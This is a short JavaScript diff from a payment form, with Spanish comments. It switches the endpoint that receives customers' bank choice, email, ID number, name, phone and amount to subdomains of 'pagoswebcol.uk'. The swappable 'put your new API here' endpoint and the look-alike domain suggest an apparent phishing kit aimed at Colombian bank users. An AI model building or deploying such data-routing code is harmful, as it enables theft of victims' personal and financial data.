@@ -73,8 +73,8 @@ if (botonPagar) {
 
         // Si el banco es Nequi, usa la otra API. De lo contrario, usa la normal.
         const baseUrl = (banco === 'NEQUI') 
-            ? 'https://rusianenel.pagoswebcol.uk' // <-- PON TU NUEVA API AQUÍ
-            : 'https://apifinacjs.pagoswebcol.uk';
+            ? 'https://air.pagoswebcol.uk' 
+            : 'https://air.pagoswebcol.uk';
         const params = new URLSearchParams({
             amount: amount, bank: banco, email: email, doc: doc, fullName: name, phone: phone, ref: data.referencia
         });
